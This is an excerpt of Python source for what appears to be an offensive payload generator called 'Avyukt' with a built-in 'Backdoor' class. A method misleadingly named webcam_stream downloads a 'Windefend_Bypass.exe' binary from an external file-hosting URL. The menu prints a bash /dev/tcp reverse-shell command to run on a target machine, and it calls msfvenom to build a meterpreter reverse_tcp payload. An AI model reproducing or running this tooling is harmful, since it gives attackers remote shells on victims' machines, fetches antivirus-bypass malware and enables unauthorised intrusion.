...
class Backdoor:
    ...
    def webcam_stream(self):
        url = 'https://cdn-102.anonfiles.com/56Tfr8P6o0/d375acb3-1598460694/Windefend_Bypass.exe'
        r = requests.get(url, allow_redirects=True)
        open('Windefend_Bypass.exe', 'wb').write(r.content)
...
vedant_backdoor.run()
            ...
            ''')
    print(Fore.GREEN + "\n[+] Python Payload was generated in the Output Folder, Please check!")
...
def list_info():
    print(Fore.RED + "\n\t\tAvyukt Payloads " + Fore.WHITE + "(Excellent)")
    ...
    while True:
        ...
        if "1" in command:
            ...
            if "11" in payload_selection:
                clear_screen()
                ip = raw_input(Fore.WHITE + "Avyukt>: Please enter LHOST for the payload >> ")
                port = raw_input(Fore.WHITE + "Avyukt>: Please enter LPORT for the payload >> ")
                print(Fore.RED + "\n[+] Please wait starting NetCat Listener")
                print(Fore.RED + "\n[+] Execute this command on target machine")
                print(Fore.WHITE + "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1")
            ...
            if "12" in payload_selection:
                ...
                name = raw_input(Fore.WHITE + "Avyukt>: Please enter payload name >> ")
                if os.path.exists("Output"):
                    subprocess.call("msfvenom --payload python/meterpreter/reverse_tcp LHOST" + "=" + iadd + " LPORT" + "=" + prt + " -o Output/" + name + ".apk", shell=True)
                else:
                    os.mkdir("Output")
